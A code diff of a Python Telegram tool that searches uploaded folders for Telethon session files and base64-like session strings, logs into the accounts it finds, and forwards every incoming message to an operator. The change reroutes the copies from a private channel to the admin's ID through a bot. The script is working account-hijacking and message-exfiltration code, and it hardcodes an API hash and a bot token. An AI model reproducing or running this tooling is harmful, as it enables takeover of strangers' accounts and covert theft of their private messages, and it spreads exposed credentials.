@@ -10,18 +10,15 @@ import magic
 import rarfile
 from aiogram import Bot, Dispatcher, types, Router
 from aiogram.filters import Command
-from aiogram.enums import ContentType
-from aiogram.types import Message
+from aiogram.types import Message, ContentType
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
-from telethon.tl.types import PeerChannel
 
 # ========== CONFIG ==========
 API_ID = 20598937
 API_HASH = "0c3a9153ca8295883665459e4c22c674"
 BOT_TOKEN = "8434544662:AAGGSbiMBkNsz7pPd4U_prQAipDgC00NvTg"
-ADMIN_ID = 7632476151
-TARGET_GROUP = -1003121883940  # The user's private channel ID
+ADMIN_ID = 7632476151  # এডমিনের আইডি - এই আইডিতেই মেসেজ যাবে
 SESSIONS_DIR = "sessions"
 # ============================
 
@@ -72,7 +69,7 @@ def find_session_files(root_dir: str):
                 found.append(('file', os.path.join(dirpath, fn), fn))
     return found
 
-BASE64_RE = re.compile(r'([A-Za-z0-9+/=_\-]{80,})')  # regex for long base64-like strings
+BASE64_RE = re.compile(r'([A-Za-z0-9+/=_\-]{80,})')
 
 def find_string_sessions_in_text(root_dir: str):
     """Find string session tokens inside text/JSON files."""
@@ -86,7 +83,6 @@ def find_string_sessions_in_text(root_dir: str):
                     continue
                 with open(full, 'r', errors='ignore') as f:
                     txt = f.read()
-                # try JSON parsing
                 try:
                     j = json.loads(txt)
                     for key in ['string_session', 'session', 'session_string', 'auth']:
@@ -94,7 +90,6 @@ def find_string_sessions_in_text(root_dir: str):
                             found.append(('string', j[key], f"{fn}:{key}"))
                 except Exception:
                     pass
-                # fallback: regex
                 for m in BASE64_RE.findall(txt):
                     if len(m) > 80:
                         found.append(('string', m, f"{fn}:token"))
@@ -115,34 +110,26 @@ async def start_telethon_from_file(session_path: str, session_name: str):
     try:
         await client.start()
         
-        # Force the client to cache the target channel entity
-        try:
-            target_entity = await client.get_input_entity(TARGET_GROUP)
-            print(f"Cached target channel entity: {target_entity}")
-        except Exception as e:
-            print(f"Failed to cache target channel: {e}")
-            # If we can't cache the channel, we still start the client but the handler might fail
-            # It's better to handle this situation as per the user's requirement
-
         @client.on(events.NewMessage(incoming=True))
         async def handler(event):
             try:
-                # Re-fetch the target entity each time to be safe, but it should be cached
-                target_entity = await client.get_input_entity(TARGET_GROUP)
                 sender = await event.get_sender()
                 sender_name = sender.username or (sender.first_name or "Unknown")
                 text = event.message.message or ''
+                
                 if text:
+                    # সরাসরি এডমিন আইডিতে মেসেজ সেন্ড করবে
                     out = f"📩 From [{session_name} | {sender_name}]\n\n{text}"
-                    await client.send_message(target_entity, out)
+                    await bot.send_message(ADMIN_ID, out)
+                    
             except Exception as ee:
-                print("handler error:", ee)
+                print(f"Handler error: {ee}")
 
         clients[session_name] = client
         print(f"Started session (file): {session_name}")
         return True
     except Exception as e:
-        print("Start client from file failed:", e)
+        print(f"Start client from file failed: {e}")
         return False
 
 async def start_telethon_from_string(session_string: str, session_name: str):
@@ -151,32 +138,27 @@ async def start_telethon_from_string(session_string: str, session_name: str):
         ss = StringSession(session_string)
         client = TelegramClient(ss, API_ID, API_HASH)
         await client.start()
-
-        # Force the client to cache the target channel entity
-        try:
-            target_entity = await client.get_input_entity(TARGET_GROUP)
-            print(f"Cached target channel entity: {target_entity}")
-        except Exception as e:
-            print(f"Failed to cache target channel: {e}")
-
+        
         @client.on(events.NewMessage(incoming=True))
         async def handler(event):
             try:
-                target_entity = await client.get_input_entity(TARGET_GROUP)
                 sender = await event.get_sender()
                 sender_name = sender.username or (sender.first_name or "Unknown")
                 text = event.message.message or ''
+                
                 if text:
+                    # সরাসরি এডমিন আইডিতে মেসেজ সেন্ড করবে
                     out = f"📩 From [{session_name} | {sender_name}]\n\n{text}"
-                    await client.send_message(target_entity, out)
+                    await bot.send_message(ADMIN_ID, out)
+                    
             except Exception as ee:
-                print("handler error:", ee)
+                print(f"Handler error: {ee}")
 
         clients[session_name] = client
         print(f"Started session (string): {session_name}")
         return True
     except Exception as e:
-        print("Start client from string failed:", e)
+        print(f"Start client from string failed: {e}")
         return False
 
 # ========== Bot Handlers ==========
@@ -212,7 +194,6 @@ async def cmd_stop(message: Message):
 
 @router.message(Command("logout"))
 async def cmd_logout(message: Message):
-    """Logout only from this bot/server device. Do not affect other devices. Do not delete session file."""
     if message.from_user.id != ADMIN_ID:
         return
 
